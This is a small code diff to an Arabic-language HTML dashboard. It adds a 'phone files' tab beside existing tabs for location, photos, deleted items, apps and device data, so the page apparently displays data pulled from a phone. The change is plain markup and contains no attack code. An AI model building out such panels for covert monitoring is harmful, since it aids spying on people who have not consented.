@@ -33,6 +33,7 @@
             <button class="tab" onclick="switchTab('location')">📍 الموقع</button>
             <button class="tab" onclick="switchTab('images')">🖼️ الصور <span id="imagesCount" class="count"></span></button>
             <button class="tab" onclick="switchTab('deleted')">🗑️ المحذوفات <span id="deletedCount" class="count"></span></button>
+            <button class="tab" onclick="switchTab('files')">📁 الملفات <span id="filesCount" class="count"></span></button>
             <button class="tab" onclick="switchTab('apps')">📱 التطبيقات <span id="appsCount" class="count"></span></button>
             <button class="tab" onclick="switchTab('device')">📊 الجهاز</button>
         </div>
@@ -75,6 +76,10 @@
             <div id="deletedTab" class="tab-pane">
                 <h3>🗑️ سلة المحذوفات</h3>
                 <div id="deletedList"></div>
+            </div>
+            <div id="filesTab" class="tab-pane">
+                <h3>📁 ملفات الهاتف</h3>
+                <div id="filesList"></div>
             </div>
             <div id="appsTab" class="tab-pane">
                 <h3>📱 التطبيقات</h3>
